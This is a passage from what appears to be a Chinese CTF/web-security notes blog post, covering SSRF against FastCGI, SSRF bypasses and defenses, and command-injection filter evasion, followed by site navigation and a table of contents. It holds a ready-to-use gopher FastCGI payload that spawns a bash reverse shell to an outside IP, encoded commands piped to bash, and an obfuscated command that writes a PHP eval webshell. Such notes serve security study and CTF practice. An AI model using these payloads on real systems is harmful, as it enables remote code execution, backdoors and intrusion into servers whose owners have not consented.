<h4 id="利用-Gopher-打fast-cgi"><a href="#利用-Gopher-打fast-cgi" class="headerlink" title="利用 Gopher 打fast-cgi"></a>利用 Gopher 打fast-cgi</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</span><br></pre></td></tr></table></figure>

<h4 id="dnslog-解决无回显"><a href="#dnslog-解决无回显" class="headerlink" title="dnslog 解决无回显"></a>dnslog 解决无回显</h4><p> <code>DNS预解析可以绕过CSP进行解析</code>，结合DNSLOG我们即可窃取在CSP保护下的Cookie。 </p>
<h4 id="布尔型ssrf"><a href="#布尔型ssrf" class="headerlink" title="布尔型ssrf"></a>布尔型ssrf</h4><p>Bool型SSRF的却永远只有True or False. 因为没有任何Response信息,所以对于攻击Payload的选择也是有很多限制的, 不能选择需要和Response信息交互的Payload </p>
<p>打Struts2</p>
<p>参考链接： <a href="https://www.uedbox.com/post/10524/" target="_blank" rel="noopener">https://www.uedbox.com/post/10524/</a> </p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ul>
<li>url解析问题</li>
<li>ip进制转换</li>
<li>短域名绕过</li>
<li>xip.io</li>
<li>302跳转</li>
<li>伪协议</li>
</ul>
<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li>
<li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li>
<li>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</li>
<li>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</li>
<li>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</li>
<li>禁用跳转</li>
</ol>
<h2 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</span><br></pre></td></tr></table></figure>

<h3 id="命令分割符"><a href="#命令分割符" class="headerlink" title="命令分割符"></a>命令分割符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>

<h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h3><p> 在Linux bash中还可以使用<code>{OS_COMMAND,ARGUMENT}</code>来执行系统命令 </p>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><p>例如： a=l;b=s;$a$b </p>
<h4 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo MTIzCg==|base64 -d 其将会打印123</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>

<p>hex</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>

<p>oct</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;) ==&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>

<h4 id="单引号或双引号绕过"><a href="#单引号或双引号绕过" class="headerlink" title="单引号或双引号绕过"></a>单引号或双引号绕过</h4><p>例如： <code>ca&#39;&#39;t flag</code> 或<code>ca&quot;&quot;t flag</code> </p>
<h4 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h4><p>例如：<code>ca\t fl\ag</code></p>
<h4 id="shell特殊变量绕过"><a href="#shell特殊变量绕过" class="headerlink" title="shell特殊变量绕过"></a>shell特殊变量绕过</h4><p> linux shell中$n表示传递给脚本或函数的参数。n 是一个数字，表示第几个参数。<br>例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。<br>$@表示<br>比如：ca$@t fla$@g<br>ca$1t fla$2g </p>
<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>ls 拼接文件，hitcon的一道题</p>
<h4 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h4><p> 命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。<br>例如：echo “a<code>pwd</code>” </p>
<h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><p> cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/web/" rel="tag"># web</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/12/10/one-line-php/" rel="next" title="one line php个人复现遇到的一些坑">
                <i class="fa fa-chevron-left"></i> one line php个人复现遇到的一些坑
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/01/29/buu-new-year/" rel="prev" title="buu红包题writeup">
                buu红包题writeup <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
            
              <p class="site-author-name" itemprop="name">Moyu</p>
              <p class="site-description motion-element" itemprop="description">hack for fun</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web基础"><span class="nav-number">1.</span> <span class="nav-text">web基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-IP-五层模型"><span class="nav-number">1.1.</span> <span class="nav-text">TCP/IP 五层模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP三次握手"><span class="nav-number">1.2.</span> <span class="nav-text">TCP三次握手</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http基础及相关攻击"><span class="nav-number">1.3.</span> <span class="nav-text">http基础及相关攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-相关组件介绍"><span class="nav-number">1.4.</span> <span class="nav-text">web 相关组件介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨域相关"><span class="nav-number">1.5.</span> <span class="nav-text">跨域相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#同源策略"><span class="nav-number">1.5.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨域数据传输方式"><span class="nav-number">1.5.2.</span> <span class="nav-text">跨域数据传输方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#document-domain"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">document.domain</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#window-name"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">window.name</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#location-hash"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">location.hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#postMessage"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">postMessage</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#JSONP"><span class="nav-number">1.5.2.5.</span> <span class="nav-text">JSONP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基础工具"><span class="nav-number">1.6.</span> <span class="nav-text">基础工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux"><span class="nav-number">1.7.</span> <span class="nav-text">linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OWASP-TOP-10-2017"><span class="nav-number">2.</span> <span class="nav-text">OWASP TOP 10 2017</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP版本特性"><span class="nav-number">3.</span> <span class="nav-text">PHP版本特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-gt-5-6"><span class="nav-number">3.1.</span> <span class="nav-text">5.5 -&gt; 5.6</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用表达式定义常量"><span class="nav-number">3.1.1.</span> <span class="nav-text">使用表达式定义常量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-运算符定义变长参数函数"><span class="nav-number">3.1.2.</span> <span class="nav-text">使用 ... 运算符定义变长参数函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-运算符进行参数展开"><span class="nav-number">3.1.3.</span> <span class="nav-text">使用 ... 运算符进行参数展开</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#use-function-以及-use-const"><span class="nav-number">3.1.4.</span> <span class="nav-text">use function 以及 use const</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-6-gt-7"><span class="nav-number">3.2.</span> <span class="nav-text">5.6 -&gt; 7</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-replace-不再支持-e修饰符"><span class="nav-number">3.2.1.</span> <span class="nav-text">preg_replace()不再支持/e修饰符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#create-function-被废弃"><span class="nav-number">3.2.2.</span> <span class="nav-text">create_function()被废弃</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-系列全员移除"><span class="nav-number">3.2.3.</span> <span class="nav-text">mysql_*系列全员移除</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unserialize-增加一个可选白名单参数"><span class="nav-number">3.2.4.</span> <span class="nav-text">unserialize()增加一个可选白名单参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#assert-默认不再可以执行代码"><span class="nav-number">3.2.5.</span> <span class="nav-text">assert()默认不再可以执行代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#foreach不再改变内部数组指针"><span class="nav-number">3.2.6.</span> <span class="nav-text">foreach不再改变内部数组指针</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#移除script标签"><span class="nav-number">3.2.7.</span> <span class="nav-text">移除script标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#超大浮点数类型转换截断"><span class="nav-number">3.2.8.</span> <span class="nav-text">超大浮点数类型转换截断</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-预加载绕过disable-function-（RCTF2019）"><span class="nav-number">3.3.</span> <span class="nav-text">7.4 预加载绕过disable_function （RCTF2019）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL注入"><span class="nav-number">4.</span> <span class="nav-text">MYSQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本操作"><span class="nav-number">4.1.</span> <span class="nav-text">基本操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">4.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-number">4.3.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注"><span class="nav-number">4.3.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注"><span class="nav-number">4.3.2.</span> <span class="nav-text">时间盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入"><span class="nav-number">4.4.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过技巧"><span class="nav-number">4.5.</span> <span class="nav-text">绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php迭代次数限制，绕过preg-match的过滤"><span class="nav-number">4.5.1.</span> <span class="nav-text">php迭代次数限制，绕过preg_match的过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#select-被过滤"><span class="nav-number">4.5.2.</span> <span class="nav-text">select 被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#括号被过滤"><span class="nav-number">4.5.3.</span> <span class="nav-text">括号被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#禁用information-schema"><span class="nav-number">4.5.4.</span> <span class="nav-text">禁用information_schema</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#格式化字符串"><span class="nav-number">4.5.5.</span> <span class="nav-text">格式化字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入，过滤concat"><span class="nav-number">4.5.6.</span> <span class="nav-text">报错注入，过滤concat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤空格"><span class="nav-number">4.5.7.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字节注入"><span class="nav-number">4.5.8.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二次urldecode注入"><span class="nav-number">4.5.9.</span> <span class="nav-text">二次urldecode注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#16进制绕过单引号被过滤或敏感词检测"><span class="nav-number">4.5.10.</span> <span class="nav-text">16进制绕过单引号被过滤或敏感词检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逗号绕过"><span class="nav-number">4.5.11.</span> <span class="nav-text">逗号绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#未知字段名"><span class="nav-number">4.5.12.</span> <span class="nav-text">未知字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用异或去爆破password"><span class="nav-number">4.5.13.</span> <span class="nav-text">利用异或去爆破password</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#between-and-盲注"><span class="nav-number">4.5.14.</span> <span class="nav-text">between and 盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#limit-注入"><span class="nav-number">4.5.15.</span> <span class="nav-text">limit 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#union-select-和-in被过滤"><span class="nav-number">4.5.16.</span> <span class="nav-text">union select 和 in被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#未知表名、不能使用逗号、不能截断的时间盲注"><span class="nav-number">4.5.17.</span> <span class="nav-text">未知表名、不能使用逗号、不能截断的时间盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他利用姿势"><span class="nav-number">4.6.</span> <span class="nav-text">其他利用姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#load-data-infile-任意文件读取"><span class="nav-number">4.6.1.</span> <span class="nav-text">load data infile 任意文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-5-7-新特性"><span class="nav-number">4.6.2.</span> <span class="nav-text">mysql 5.7 新特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写文件-getshell"><span class="nav-number">4.6.3.</span> <span class="nav-text">写文件 getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql提权"><span class="nav-number">4.6.4.</span> <span class="nav-text">mysql提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-防止sql注入"><span class="nav-number">4.7.</span> <span class="nav-text">php 防止sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#魔术引用"><span class="nav-number">4.7.1.</span> <span class="nav-text">魔术引用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-real-escape-string"><span class="nav-number">4.7.2.</span> <span class="nav-text">mysql_real_escape_string()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预处理查询-Prepared-Statements"><span class="nav-number">4.7.3.</span> <span class="nav-text">预处理查询 (Prepared Statements)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell"><span class="nav-number">5.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash"><span class="nav-number">5.1.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-number">5.2.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-number">5.3.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java"><span class="nav-number">5.4.</span> <span class="nav-text">java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl"><span class="nav-number">5.5.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ruby"><span class="nav-number">5.6.</span> <span class="nav-text">ruby</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">5.7.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msfvenom"><span class="nav-number">5.8.</span> <span class="nav-text">msfvenom</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">6.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI"><span class="nav-number">6.1.</span> <span class="nav-text">LFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RFI"><span class="nav-number">6.2.</span> <span class="nav-text">RFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见敏感文件"><span class="nav-number">6.3.</span> <span class="nav-text">常见敏感文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#windows"><span class="nav-number">6.3.1.</span> <span class="nav-text">windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-1"><span class="nav-number">6.3.2.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#java-1"><span class="nav-number">6.3.2.1.</span> <span class="nav-text">java</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#系统"><span class="nav-number">6.3.3.</span> <span class="nav-text">系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常规操作"><span class="nav-number">6.4.</span> <span class="nav-text">常规操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php伪协议"><span class="nav-number">6.4.1.</span> <span class="nav-text">php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input"><span class="nav-number">6.4.1.1.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-filter"><span class="nav-number">6.4.1.2.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#phar"><span class="nav-number">6.4.1.3.</span> <span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zip"><span class="nav-number">6.4.1.4.</span> <span class="nav-text">zip://</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#data-URI-schema"><span class="nav-number">6.4.1.5.</span> <span class="nav-text">data:URI schema</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含session"><span class="nav-number">6.4.2.</span> <span class="nav-text">包含session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含日志"><span class="nav-number">6.4.3.</span> <span class="nav-text">包含日志</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#服务器日志"><span class="nav-number">6.4.3.1.</span> <span class="nav-text">服务器日志</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh日志"><span class="nav-number">6.4.3.2.</span> <span class="nav-text">ssh日志</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含environ"><span class="nav-number">6.4.4.</span> <span class="nav-text">包含environ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#包含临时文件"><span class="nav-number">6.4.5.</span> <span class="nav-text">包含临时文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过姿势"><span class="nav-number">6.5.</span> <span class="nav-text">绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#指定前缀"><span class="nav-number">6.5.1.</span> <span class="nav-text">指定前缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#指定后缀"><span class="nav-number">6.5.2.</span> <span class="nav-text">指定后缀</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势一：query-？"><span class="nav-number">6.5.2.1.</span> <span class="nav-text">姿势一：query ？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势二：fragment"><span class="nav-number">6.5.2.2.</span> <span class="nav-text">姿势二：fragment</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势三：长度截断"><span class="nav-number">6.5.2.3.</span> <span class="nav-text">姿势三：长度截断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#姿势四：0字节截断"><span class="nav-number">6.5.2.4.</span> <span class="nav-text">姿势四：0字节截断</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strops-绕过"><span class="nav-number">6.5.3.</span> <span class="nav-text">strops 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-lt-7-2-段错误-包含临时文件"><span class="nav-number">6.5.4.</span> <span class="nav-text">php&lt;7.2 段错误 包含临时文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpinfo-LFI-本地文件包含临时文件getshell"><span class="nav-number">6.5.5.</span> <span class="nav-text">phpinfo-LFI 本地文件包含临时文件getshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方案"><span class="nav-number">6.6.</span> <span class="nav-text">防御方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">7.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有回显，直接读文件"><span class="nav-number">7.1.</span> <span class="nav-text">有回显，直接读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显，引用服务器上的XML文件"><span class="nav-number">7.2.</span> <span class="nav-text">无回显，引用服务器上的XML文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显，利用报错直接使用本地DTD"><span class="nav-number">7.3.</span> <span class="nav-text">无回显，利用报错直接使用本地DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fonts-dtd"><span class="nav-number">7.3.1.</span> <span class="nav-text">fonts.dtd:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mbeans-descriptors-dtd"><span class="nav-number">7.3.2.</span> <span class="nav-text">mbeans-descriptors.dtd:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#docbookx-dtd"><span class="nav-number">7.3.3.</span> <span class="nav-text">docbookx.dtd</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RSS-XXE"><span class="nav-number">7.4.</span> <span class="nav-text">RSS XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass"><span class="nav-number">7.5.</span> <span class="nav-text">bypass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-反序列化"><span class="nav-number">8.</span> <span class="nav-text">python 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python序列化和反序列化是什么"><span class="nav-number">8.1.</span> <span class="nav-text">python序列化和反序列化是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-序列化过程："><span class="nav-number">8.1.1.</span> <span class="nav-text">1.序列化过程：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-反序列化过程："><span class="nav-number">8.1.2.</span> <span class="nav-text">2.反序列化过程：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#为什么要实现序列化和反序列化？"><span class="nav-number">8.2.</span> <span class="nav-text">为什么要实现序列化和反序列化？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-几个重要的函数"><span class="nav-number">8.2.1.</span> <span class="nav-text">1.几个重要的函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化漏洞往往出现在什么地方"><span class="nav-number">8.3.</span> <span class="nav-text">反序列化漏洞往往出现在什么地方</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通常在解析认证token，session的时候"><span class="nav-number">8.3.1.</span> <span class="nav-text">通常在解析认证token，session的时候</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可能将对象Pickle后存储成磁盘文件"><span class="nav-number">8.3.2.</span> <span class="nav-text">可能将对象Pickle后存储成磁盘文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可能将对象Pickle后在网络中传输"><span class="nav-number">8.3.3.</span> <span class="nav-text">可能将对象Pickle后在网络中传输</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用反序列化漏洞"><span class="nav-number">8.4.</span> <span class="nav-text">利用反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方法"><span class="nav-number">8.5.</span> <span class="nav-text">防御方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实战"><span class="nav-number">8.6.</span> <span class="nav-text">实战</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-1"><span class="nav-number">9.</span> <span class="nav-text">php</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shell"><span 